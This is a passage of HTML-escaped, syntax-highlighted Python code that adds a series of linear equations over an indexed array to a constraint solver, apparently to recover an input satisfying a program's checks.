style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37017&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72092&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span 